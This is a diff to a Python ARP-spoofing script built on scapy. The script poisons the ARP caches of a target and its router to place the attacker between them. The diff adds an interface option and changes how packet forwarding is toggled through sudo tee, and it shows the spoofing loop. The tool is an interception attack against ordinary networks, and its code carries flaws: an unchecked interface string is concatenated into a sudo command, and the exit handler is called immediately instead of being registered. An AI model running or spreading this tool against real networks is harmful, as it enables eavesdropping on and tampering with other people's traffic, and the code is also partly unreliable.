@@ -21,6 +21,8 @@ def get_arguments():
     parser = argparse.ArgumentParser()
     parser.add_argument("-t", "--target", dest="target", help="Target's IP")
     parser.add_argument("-r", "--router", dest="router", help="Router's IP")
+    parser.add_argument("-i", "--interface", dest="interface", help="interface being used")
+
     options = parser.parse_args()
 
     if not options.target:
@@ -30,6 +32,10 @@ def get_arguments():
         print("[-] Missing the router's IP")
         # print("[+] router's IP wasn't entered, finding gateway IP")
         # options.router = router_ip_finder()
+
+    if not options.interface:
+        print("[+] Missing the interface, assuming wlp2s0")
+        options.interface = "wlp2s0"
 
     return options
 
@@ -51,20 +57,21 @@ def spoof(dest_IP, spoofed_IP):
     return packet
 
 
-def start_flow():
+def start_flow(i):
     print("[+] Stated port forwarding")
-    subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward")
+    subprocess.run("echo '1' | sudo tee /proc/sys/net/ipv4/conf/" + i + "/forwarding")
 
 
-def stop_flow():
+def stop_flow(i):
     print("[+] ending port forwarding")
-    subprocess.run("echo 0 > /proc/sys/net/ipv4/ip_forward")
+    subprocess.run("echo '0' | sudo tee /proc/sys/net/ipv4/conf/" + i + "/forwarding")
 
 
 def main():
     options = get_arguments()
     target_IP = options.target
     router_IP = options.router
+    interface = options.interface
 
     packet_for_target = spoof(target_IP, router_IP)
     packet_for_router = spoof(router_IP, target_IP)
@@ -77,7 +84,7 @@ def main():
         scapy.send(packet_for_router)
         time.sleep(3)
 
-    atexit.register(stop_flow)
+    atexit.register(stop_flow(interface))
 
 
 main()
